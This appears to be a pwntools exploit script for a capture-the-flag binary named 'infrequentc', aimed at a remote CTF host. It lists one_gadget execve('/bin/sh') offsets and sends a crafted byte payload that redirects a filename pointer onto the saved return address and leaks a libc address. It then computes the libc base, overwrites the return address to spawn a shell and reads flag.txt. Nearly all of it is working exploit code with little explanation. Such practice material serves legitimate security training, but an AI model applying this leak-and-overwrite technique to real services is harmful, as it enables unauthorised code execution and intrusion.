#!/usr/bin/env python3

from pwn import *

exe = ELF("program/infrequentc_patched")
libc = ELF("program/libc.so.6")
ld = ELF("program/ld-2.27.so")

#exe = ELF("infrequent")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13374

gdbscript = '''
b *main+593
c
'''

"""
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
"""


#TODO: probably change value of filename for arb write?
# signed char, negative offset increment, overwrite return address?

if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

num_to_adjust_filename = 0x7fffd59da0c8 - 0x7fffd59da092
assert 0 < num_to_adjust_filename < 600

num_to_adjust_text = 10

offset_to_leak = 265


# We can leak the value at an offset < 0 by having largest be a negative char maybe? nah

# set filename to return address so we get arb write to it
# TODO: can we adjust text to leak a libc address?

payload = b''.join([
bytes([0xff for _ in range(num_to_adjust_filename)]), # set filename to return address for overwrite
bytes([0xfd for _ in range(offset_to_leak)]), # leak libc addr by setting largest
])

r.sendlineafter(b'on:', payload)

print(r.recvuntil(b'showing up ').decode())

libc_leak = int(r.recvline().split()[0])
libc_base = (libc_leak - 231) - libc.symbols['__libc_start_main']
print(hex(libc_base))

r.sendlineafter(b'(leave blank for default)', p64(libc_base + 0x10a2fc))

r.sendline(b'cat flag.txt')
r.interactive()
